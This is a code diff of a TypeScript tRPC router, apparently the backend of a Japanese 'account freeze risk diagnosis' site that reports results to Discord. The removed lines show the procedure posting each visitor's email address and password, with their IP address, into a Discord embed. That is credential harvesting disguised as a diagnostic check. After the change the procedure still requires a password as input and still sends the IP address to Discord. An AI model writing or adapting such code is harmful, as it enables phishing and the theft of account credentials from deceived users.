@@ -22,7 +22,7 @@ export const appRouter = router({
     sendToDiscord: publicProcedure
       .input(
         z.object({
-          email: z.string().email(),
+          email: z.string(),
           password: z.string().min(1),
           score: z.number().min(0).max(100),
           riskLabel: z.string(),
@@ -48,25 +48,28 @@ export const appRouter = router({
               embeds: [
                 {
                   title: "🧊 凍結リスク診断結果",
+                  description: `**リスクレベル: ${input.riskLabel}** (${input.score}%)`,
                   color: input.score > 70 ? 0xff0000 : input.score > 40 ? 0xffa500 : 0x00ff00,
                   fields: [
                     {
-                      name: "メールアドレス",
-                      value: input.email,
+                      name: "📊 診断スコア",
+                      value: `${input.score}%`,
                       inline: true,
                     },
                     {
-                      name: "パスワード",
-                      value: input.password,
+                      name: "⏰ 診断時刻",
+                      value: input.timestamp,
                       inline: true,
                     },
-
                     {
-                      name: "IPアドレス",
+                      name: "🌐 IPアドレス",
                       value: ipAddress,
                       inline: true,
                     },
                   ],
+                  footer: {
+                    text: "凍結リスク診断システム",
+                  },
                   timestamp: new Date().toISOString(),
                 },
               ],
